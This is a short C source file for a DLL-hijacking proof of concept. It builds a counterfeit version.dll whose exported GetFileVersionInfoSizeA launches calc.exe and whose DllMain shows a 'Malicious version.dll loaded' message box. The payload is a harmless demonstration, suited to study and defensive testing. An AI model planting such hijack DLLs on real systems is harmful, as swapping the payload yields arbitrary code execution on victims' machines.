#include <windows.h>

// Export a function with the same name as the legitimate function in version.dll
__declspec(dllexport) DWORD APIENTRY GetFileVersionInfoSizeA(LPCSTR lpFileName, LPDWORD lpHandle) {
    // Instead of getting file version info, we launch the calculator
    system("start calc.exe");

    // We can return 0 to indicate failure, as there's no version info to provide
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            MessageBox(NULL, "Malicious version.dll loaded", "DLL Hijacking", MB_OK);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE; // Successful DLL_PROCESS_ATTACH
}
